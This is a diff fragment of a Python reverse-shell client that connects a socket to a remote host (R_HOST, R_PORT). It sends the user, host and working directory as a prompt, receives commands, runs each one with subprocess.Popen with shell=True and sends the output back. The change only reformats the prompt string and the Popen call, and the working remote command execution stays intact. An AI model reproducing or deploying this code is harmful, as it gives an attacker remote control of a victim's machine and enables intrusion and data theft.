@@ -16,8 +16,8 @@ sock.connect((R_HOST, R_PORT))
 print("Connection established!")
 while True:
     try:
-        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}
-{Style.RESET_ALL}$ """
+        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}
+{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
         sock.send(header.encode())
         STDOUT, STDERR = None, None
         cmd = sock.recv(1024).decode("utf-8")
@@ -53,8 +53,8 @@ Processor Architecture: {platform.processor()}
             sock.send(b"exit")
             break
         else:  # Run any other command
-            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                    stdin=subprocess.PIPE)
+            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, 
+stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             STDOUT, STDERR = comm.communicate()
             if not STDOUT:
                 sock.send(STDERR)
